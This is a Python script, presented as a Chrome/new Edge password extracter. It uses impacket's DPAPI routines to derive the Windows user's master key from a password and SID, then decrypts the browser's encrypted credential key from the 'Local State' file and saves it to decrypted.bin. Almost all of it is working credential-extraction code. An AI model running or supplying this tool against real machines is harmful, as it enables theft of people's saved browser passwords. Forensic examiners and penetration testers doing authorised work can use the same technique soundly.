#!/usr/bin/python3
#
# Chrome / new Edge Browser password extracter.
# This only extract the key needed to decrypt the credentials 
# Output is decrypted.bin
#
from binascii import unhexlify, hexlify
from hashlib import pbkdf2_hmac

from Cryptodome.Cipher import AES, PKCS1_v1_5
from Cryptodome.Hash import HMAC, SHA1, MD4

from impacket.dpapi import *
import argparse
import sys
import os
import json
import base64
import sqlite3
import re

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def local_state_file(path):
    with open(path + 'Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    dpapi_blob = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    dpapi_blob = dpapi_blob[5:]  # removing DPAPI text
    '''
    f = open('Cred.dpapi','wb')
    f.write(dpapi_blob)
    f.close()
    '''
    return dpapi_blob

def master(master_key,sid,password):

    #master_key
    fp = open(master_key, 'rb')
    data = fp.read()
    mkf= MasterKeyFile(data)
    mkf.dump()

    fp.close()
    data = data[len(mkf):]
    mk = MasterKey(data[:mkf['MasterKeyLen']])

    # Will generate two keys, one with SHA1 and another with MD4
    key1 = HMAC.new(SHA1.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
    key2 = HMAC.new(MD4.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
    # For Protected users
    tmpKey = pbkdf2_hmac('sha256', MD4.new(password.encode('utf-16le')).digest(), sid.encode('utf-16le'), 10000)
    tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
    key3 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]

    #/key1, key2, key3 = self.deriveKeysFromUser(self.options.sid, password)

    # if mkf['flags'] & 4 ? SHA1 : MD4
    decryptedKey = mk.decrypt(key3)
    if decryptedKey:
        print('Decrypted key with User Key (MD4 protected)')
        print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
        return decryptedKey

    decryptedKey = mk.decrypt(key2)
    if decryptedKey:
        print('Decrypted key with User Key (MD4)')
        print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
        return decryptedKey

    decryptedKey = mk.decrypt(key1)
    if decryptedKey:
        print('Decrypted key with User Key (SHA1)')
        print('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
        return decryptedKey

# arguments
parser = argparse.ArgumentParser()
parser.add_argument("--dir","-d",default='./', help="directory where Local State and Login Data is located")
parser.add_argument("--masterkey", "-m", help="set masterkey directory")
parser.add_argument("--sid", "-s", help="set SID(optional)")
parser.add_argument("--password", "-p", help="user password")
#parser.add_argument("--nopass","-n",dest="nopass",action='store_true',help="no password")
parser.set_defaults(nopass=False)
args = parser.parse_args()


file_list=[]
if args.dir:
    for f in (os.listdir(args.dir)):
        file_list.append(os.path.join(args.dir, f))
if not ( (args.dir + 'Local State' in file_list) and (args.dir + 'Login Data' in file_list)):
    print("No Local State and Login Data found in that directory")
    sys.exit(2)
else:
    print(bcolors.OKGREEN +" * "+ bcolors.ENDC + "Local State and Login Data files found" )

#call function to read Local State file and get an impacket Blob dpapi file
blob = DPAPI_BLOB(local_state_file(args.dir))

#impacket open blob
master_key_needed = (bin_to_string(blob['GuidMasterKey']).lower())
file_list=[]
if (args.masterkey):
    for f in (os.listdir(args.masterkey)):
        file_list.append(os.path.join(args.masterkey, f))
    if not ( args.masterkey + master_key_needed in file_list):
        print("Masterkey " + master_key_needed + " not found")
        sys.exit(2)
    else:
        print(bcolors.OKGREEN +" * "+ bcolors.ENDC + "MasterKey file found" )
else:
    print("Needed masterkey(-m) directory with the location of " + master_key_needed)
    sys.exit(2)

if not args.sid:
    try:
        sid = ( re.search('((S-1).*?)/', args.masterkey )[1])
        print(bcolors.OKGREEN +" * "+ bcolors.ENDC + "SID " + sid )
    except:
        print("Need to specify SID")
        sys.exit(2)

if not args.password:
    print("Need user password (-p)")
    sys.exit(2)

print(args.masterkey + master_key_needed)
print(args.password)
# go for the decrypt
key = master( args.masterkey + master_key_needed , sid , args.password)

#print(hexlify(key).decode('latin-1'))

if (key):
    #key = unhexlify(key)
    decrypted = blob.decrypt(key)
    if decrypted is not None:
        print()
        print("# # Success! (saved to decrypted.bin) # #")
        print()
        #print(decrypted.decode('utf-16-le'))
        f = open('decrypted.bin','wb')
        f.write(decrypted)
        f.close()
else:
    # Just print the data
    print("Error decrypting")
    blob.dump()

